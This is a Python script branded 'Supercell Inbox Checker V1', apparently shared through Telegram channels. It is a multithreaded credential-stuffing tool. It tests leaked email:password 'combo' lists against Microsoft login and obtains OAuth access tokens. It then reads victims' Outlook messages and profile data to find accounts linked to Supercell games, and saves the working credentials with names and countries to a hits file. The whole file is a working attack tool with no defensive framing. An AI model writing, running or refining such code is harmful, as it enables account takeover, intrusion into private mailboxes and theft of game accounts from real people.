#Owner : @pypkg
#Channel : https://t.me/+zZUKD1RHroA5ODc8
#Chat : https://t.me/pyabrodies

import sys
from datetime import datetime
import requests
import json
import uuid
import re
import time
import os
import threading
from datetime import datetime
from urllib.parse import quote
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

class SupercellChecker:
    def __init__(self):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.supercell_patterns = [
            "noreply@supercell.com",
            "no-reply@clashofclans.com",
            "noreply@clashroyale.com",
            "noreply@brawlstars.com",
            "noreply@hayday.com",
            "noreply@boombeach.com",
            "@supercell.com"
        ]

    def parse_country_from_json(self, json_data):
        """Extract country from Microsoft account JSON response"""
        if not json_data or not isinstance(json_data, dict):
            return ''
        
        try:
            if "location" in json_data and isinstance(json_data["location"], dict):
                location = json_data["location"]
                for key in ["country", "countryCode", "region", "name"]:
                    if key in location and location[key]:
                        return str(location[key])
            
            if "user" in json_data and isinstance(json_data["user"], dict):
                user = json_data["user"]
                for key in ["country", "location", "region"]:
                    if key in user and user[key]:
                        return str(user[key])
            
            if "profile" in json_data and isinstance(json_data["profile"], dict):
                profile = json_data["profile"]
                for key in ["country", "location", "address"]:
                    if key in profile and profile[key]:
                        return str(profile[key])
            
            for key, value in json_data.items():
                if isinstance(value, str) and len(value) == 2 and value.isalpha() and value.upper() == value:
                    return value
                if isinstance(value, dict):
                    result = self.parse_country_from_json(value)
                    if result:
                        return result
        
        except Exception:
            pass
        return ''

    def parse_name_from_json(self, json_data):
        """Extract user name from Microsoft account JSON response"""
        if not json_data or not isinstance(json_data, dict):
            return ''
        
        try:
            if "name" in json_data and json_data["name"]:
                return str(json_data["name"])
            
            if "displayName" in json_data and json_data["displayName"]:
                return str(json_data["displayName"])
            
            if "user" in json_data and isinstance(json_data["user"], dict):
                for key in ["name", "displayName", "username"]:
                    if key in json_data["user"] and json_data["user"][key]:
                        return str(json_data["user"][key])
            
            if "profile" in json_data and isinstance(json_data["profile"], dict):
                for key in ["name", "displayName", "givenName"]:
                    if key in json_data["profile"] and json_data["profile"][key]:
                        return str(json_data["profile"][key])
            
            for value in json_data.values():
                if isinstance(value, dict):
                    result = self.parse_name_from_json(value)
                    if result:
                        return result
        
        except Exception:
            pass
        return ''

    def count_supercell_emails(self, text):
        """Count Supercell email references in text"""
        if not text:
            return 0
        
        text_lower = text.lower()
        patterns = [
            r'noreply@supercell\.com',
            r'no-reply@clashofclans\.com', 
            r'noreply@clashroyale\.com',
            r'noreply@brawlstars\.com',
            r'noreply@hayday\.com',
            r'@supercell\.com'
        ]
        
        count = 0
        for pattern in patterns:
            count += len(re.findall(pattern, text_lower))
        return count

    def check(self, email, password):
        """
        Check Microsoft account credentials and scan for Supercell emails
        Returns dict with status and account information
        """
        url1 = f'https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}'
        
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://login.live.com/",
            "Origin": "https://login.live.com"
        }
        
        try:
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            
            if "Domain does not exist" in r1.text or "no such domain" in r1.text or "Not Found" in r1.text or "Invalid" in r1.text:
                return {"status": "bad", "error": "No Microsoft account", "retry": False, "code": 0}
            
            if "login.microsoftonline.com" not in r1.text and "login.live.com" not in r1.text:
                return {"status": "bad", "error": "Invalid response", "retry": False, "code": 0}
            
            r2 = self.session.get(f'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D', 
                                 headers=headers1, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost:"([^"]+)"', r2.text)
            ppft_match = re.search(r'value="([^"]+)" name="PPFT"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "bad", "error": "Could not extract login parameters", "retry": True, "code": 0}
            
            post_url = url_match.group(1).replace('\\/', '/')
            ppft = ppft_match.group(1)
            
            login_data = f'i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960'
            
            headers3 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": r2.url
            }
            
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            if "If you are not redirected" in r3.text or r3.text.count("login") > 5 or "success" in r3.text.lower():
                return {"status": "hit", "result": "login_success", "retry": False, "code": 1}
            
            if "incorrect" in r3.text.lower() or "Invalid" in r3.text or "auth" in r3.text and "fail" in r3.text:
                return {"status": "bad", "error": "Invalid credentials", "retry": False, "code": 0}
            
            if "verify" in r3.text.lower() and "email" in r3.text.lower():
                return {"status": "verification_required", "error": "Email verification required", "retry": False, "code": 0}
            
            location = r3.headers.get('Location', '')
            if not location:
                return {"status": "bad", "error": "No redirect location", "retry": True, "code": 0}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "bad", "error": "No authorization code", "retry": True, "code": 0}
            
            code = code_match.group(1)
            
            mspcid = self.session.cookies.get('MSPCID', '')
            if not mspcid:
                return {"status": "bad", "error": "No MSPCID cookie", "retry": True, "code": 0}
            
            cid = mspcid.upper()
            
            token_url = "https://login.live.com/oauth20_token.srf"
            token_data = f'client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access'
            
            headers4 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0"
            }
            
            r4 = self.session.post(token_url, data=token_data, headers=headers4, timeout=15)
            
            if "error" in r4.text:
                return {"status": "bad", "error": "Token exchange failed", "retry": False, "code": 0}
            
            token_json = r4.json()
            access_token = token_json.get('access_token', '')
            
            if not access_token:
                return {"status": "bad", "error": "No access token", "retry": False, "code": 0}
            
            profile_headers = {
                "Authorization": f'Bearer {access_token}',
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json"
            }
            
            country = ''
            name = ''
            
            try:
                r5 = self.session.get("https://graph.microsoft.com/v1.0/me", headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    country = self.parse_country_from_json(profile)
                    name = self.parse_name_from_json(profile)
            except Exception:
                pass
            
            if not country:
                try:
                    r5b = self.session.get("https://graph.microsoft.com/v1.0/me?$select=country,displayName", headers=profile_headers, timeout=15)
                    if r5b.status_code == 200:
                        graph_data = r5b.json()
                        if not country:
                            country = self.parse_country_from_json(graph_data)
                        if not name:
                            name = self.parse_name_from_json(graph_data)
                except Exception:
                    pass
            
            result = {
                "access_token": access_token,
                "cid": cid,
                "request_id": str(uuid.uuid4()),
                "preferred_username": email,
                "name": name if name else email.split('@')[0],
                "country": country if country else "Unknown"
            }
            
            messages_headers = {
                "Authorization": f'Bearer {access_token}',
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json"
            }
            
            found_count = 0
            all_text = ''
            
            try:
                r6 = self.session.post(f'https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0', data='', headers=result, timeout=30)
                if r6.status_code == 200:
                    all_text += r6.text
            except Exception:
                pass
            
            try:
                r7 = self.session.get('https://outlook.office365.com/api/v2.0/me/messages?$top=50&$select=From,Subject,Body', headers=messages_headers, timeout=30)
                if r7.status_code == 200:
                    messages_data = r7.json()
                    if "value" in messages_data:
                        for message in messages_data["value"]:
                            sender = message.get("From", {})
                            if isinstance(sender, dict):
                                email_address = sender.get("EmailAddress", {})
                                if isinstance(email_address, dict):
                                    sender_email = email_address.get("Address", "").lower()
                                    if "supercell" in sender_email or "clashofclans" in sender_email or "clashroyale" in sender_email:
                                        found_count += 1
                            subject = message.get("Subject", "").lower()
                            body = message.get("Body", {}).get("Content", "").lower()
                            if "supercell" in subject or "supercell" in body:
                                found_count += 1
            except Exception:
                pass
            
            if all_text:
                found_count += self.count_supercell_emails(all_text)
            
            result["supercell_count"] = found_count
            
            if found_count > 0:
                return {"status": "hit", "result": result, "retry": False, "code": 2}
            else:
                return {"status": "hit", "result": result, "retry": False, "code": 1}
            
        except Exception:
            return {"status": "bad", "error": "Connection error", "retry": True, "code": 0}

class ResultManager:
    def __init__(self):
        self.supercell_file = "supercell_hits._by_@pyabrodies.txt"

    def save_supercell_hit(self, email, password, result_data):
        """Save Supercell account hit to file"""
        country = result_data.get("country", "").strip().upper()
        name = result_data.get("name", "")
        found_count = result_data.get("supercell_count", 0)
        
        result_line = f'{email}:{password}'
        if country:
            result_line += f' | Country: {country}'
        if name:
            result_line += f' | Name: {name}'
        result_line += ' | Keyword: noreply@supercell.com'
        result_line += f' | Found: {found_count}'
        result_line += ' | by = @QuatrHuit\n'
        
        with open(self.supercell_file, 'a', encoding='utf-8') as f:
            f.write(result_line)

class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.bads = 0
        self.retries = 0
        self.unknown = 0
        self.start_time = time.time()
        self.lock = Lock()

    def update(self, status):
        with self.lock:
            self.checked += 1
            if status == "hit":
                self.hits += 1
            elif status == "bad":
                self.bads += 1
            elif status == "retry":
                self.retries += 1
            else:
                self.unknown += 1

    def get_stats(self):
        with self.lock:
            elapsed = max(0, time.time() - self.start_time)
            cpm = int(self.checked / elapsed * 60) if elapsed > 0 else 0
            return {
                "total": self.total,
                "checked": self.checked,
                "hits": self.hits,
                "bads": self.bads,
                "retries": self.retries,
                "unknown": self.unknown,
                "cpm": cpm,
                "elapsed": elapsed
            }

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def animated_loading():
    frames = [Colors.CYAN + '◰' + Colors.END, Colors.BLUE + '◳' + Colors.END, 
              Colors.MAGENTA + '◲' + Colors.END, Colors.GREEN + '◱' + Colors.END]
    print(Colors.BOLD + Colors.CYAN + '🞙 SUPERCELL INBOX CHECKER V1' + Colors.END)
    print(Colors.BOLD + Colors.WHITE + 'STARTING SYSTEM...' + Colors.END)
    for i in range(8):
        frame = frames[i % 4]
        progress_bar = '█' * (i + 1) + '▒' * (7 - i)
        print(f'\r{Colors.BOLD}{frame} LOADING [{progress_bar}] {frame}{Colors.END}', end='', flush=True)
        time.sleep(0.1)
    print()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_stats_display(stats):
    elapsed_str = time.strftime('%H:%M:%S', time.gmtime(stats["elapsed"]))
    display = f'''
{Colors.CYAN}{Colors.BOLD}┌────────────────────────────────────────────────────────┐
│              SUPERCELL INBOX CHECKER V1              │
├────────────────────────────────────────────────────────┤
│  {Colors.WHITE}CHECKED: {Colors.CYAN}{stats["checked"]:6d}/{stats["total"]:<6d}{Colors.WHITE} CPM: {Colors.CYAN}{stats["cpm"]:6.0f}{Colors.CYAN}     │
│  {Colors.GREEN}HIT: {Colors.CYAN}{stats["hits"]:6d}   {Colors.RED}BAD: {Colors.CYAN}{stats["bads"]:6d}   {Colors.YELLOW}RETRIES: {Colors.CYAN}{stats["retries"]:4d}   │
│  {Colors.MAGENTA}UNKNOWN:{Colors.CYAN}{stats["unknown"]:4d}   {Colors.WHITE}TIME: {Colors.CYAN}{elapsed_str:<12} │
└────────────────────────────────────────────────────────┘{Colors.END}
'''
    print(f'\x1b[2K\r{display}', end='', flush=True)

def main():
    clear_screen()
    banner = f'''
{Colors.CYAN}{Colors.BOLD}
┌────────────────────────────────────────────────────────┐
│              SUPERCELL INBOX CHECKER V1              │
│              DEVELOPER: @pyabrodies.                        │
│              CHANNEL: @QuatrHuit                   │
└────────────────────────────────────────────────────────┘{Colors.END}
'''
    print(banner)
    
    try:
        animated_loading()
    except Exception as e:
        print(f'{Colors.RED}{Colors.BOLD}⚠ SYSTEM WARNING: {e}{Colors.END}')
        print(f'{Colors.YELLOW}{Colors.BOLD}⚠ CONTINUING WITH BASIC LOAD...{Colors.END}')
        time.sleep(1)
    
    print(f'{Colors.YELLOW}{Colors.BOLD}🞙 STARTING IN 1 SECOND...{Colors.END}')
    time.sleep(1)
    print(f'{Colors.CYAN}{Colors.BOLD}┌────────────────────────────────────────────────────────┐{Colors.END}')
    
    try:
        file_path = input(f'{Colors.GREEN}{Colors.BOLD}⎆ ENTER COMBO FILE PATH: {Colors.END}').strip()
        if not os.path.exists(file_path):
            print(f'{Colors.RED}{Colors.BOLD}✗ FILE NOT FOUND! {Colors.END}')
            return None
        
        try:
            threads = int(input(f'{Colors.GREEN}{Colors.BOLD}⎆ ENTER THREADS (1-25):  {Colors.END}').strip())
        except Exception:
            threads = 5
            print(f'{Colors.YELLOW}{Colors.BOLD}⚠ USING DEFAULT: 5 THREADS {Colors.END}')
        
        threads = max(1, min(25, threads))
        
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not lines:
            print(f'{Colors.RED}{Colors.BOLD}✗ NO VALID ACCOUNTS FOUND! {Colors.END}')
            return None
        
        result_manager = ResultManager()
        live_stats = LiveStats(len(lines))
        
        print(f'{Colors.GREEN}{Colors.BOLD}✓ LOADED {len(lines)} ACCOUNTS {Colors.END}')
        print(f'{Colors.BLUE}{Colors.BOLD}⎆ THREADS:  {threads}{Colors.END}')
        print(f'{Colors.MAGENTA}{Colors.BOLD}⎆ RESULTS FILE:  {result_manager.supercell_file}{Colors.END}')
        print(f'{Colors.CYAN}{Colors.BOLD}────────────────────────────────────────────────────────{Colors.END}')
        print(f'{Colors.GREEN}{Colors.BOLD}🞙 STARTING CHECKING PROCESS...{Colors.END}')
        time.sleep(1)
        clear_screen()
        print(banner)
        print(f'{Colors.GREEN}{Colors.BOLD}🞙 CHECKING PROCESS STARTED {Colors.END}')
        print_stats_display(live_stats.get_stats())
        
        def process_account(line_data):
            line, idx = line_data
            email, password = line.split(':', 1)
            email = email.strip()
            password = password.strip()
            checker = SupercellChecker()
            result = checker.check(email, password)
            live_stats.update(result.get("status", "unknown"))
            if result.get("status") == "hit":
                result_manager.save_supercell_hit(email, password, result.get("result", {}))
            print_stats_display(live_stats.get_stats())
        
        if threads == 1:
            for i, line in enumerate(lines, 1):
                process_account((line, i))
                time.sleep(0.5)
        else:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                line_data = [(line, i) for i, line in enumerate(lines, 1)]
                list(executor.map(process_account, line_data))
        
        final_stats = live_stats.get_stats()
        clear_screen()
        print(banner)
        print(f'{Colors.CYAN}{Colors.BOLD}════════════════════════════════════════════════════════{Colors.END}')
        print(f'{Colors.BOLD}{Colors.GREEN}✓ CHECK COMPLETED! {Colors.END}')
        print(f'{Colors.CYAN}{Colors.BOLD}────────────────────────────────────────────────────────{Colors.END}')
        print(f'{Colors.WHITE}{Colors.BOLD}TOTAL ACCOUNTS:  {final_stats["total"]}{Colors.END}')
        print(f'{Colors.GREEN}{Colors.BOLD}SUPERCELL HITS:  {final_stats["hits"]}{Colors.END}')
        print(f'{Colors.RED}{Colors.BOLD}BAD ACCOUNTS:  {final_stats["bads"]}{Colors.END}')
        print(f'{Colors.YELLOW}{Colors.BOLD}RETRIES:  {final_stats["retries"]}{Colors.END}')
        print(f'{Colors.MAGENTA}{Colors.BOLD}UNKNOWN:  {final_stats["unknown"]}{Colors.END}')
        print(f'{Colors.BLUE}{Colors.BOLD}CPM: {final_stats["cpm"]:.0f}{Colors.END}')
        print(f'{Colors.CYAN}{Colors.BOLD}ELAPSED:  {time.strftime("%H:%M:%S", time.gmtime(final_stats["elapsed"]))}{Colors.END}')
        print(f'{Colors.GREEN}{Colors.BOLD}RESULTS SAVED IN:  {result_manager.supercell_file}{Colors.END}')
        print(f'{Colors.CYAN}{Colors.BOLD}════════════════════════════════════════════════════════{Colors.END}')
        
    except FileNotFoundError:
        print(f'{Colors.RED}{Colors.BOLD}✗ FILE NOT FOUND! {Colors.END}')
        return None
    except Exception as e:
        print(f'{Colors.RED}{Colors.BOLD}✗ ERROR: {e}{Colors.END}')
        return None

if __name__ == "__main__":
    main()
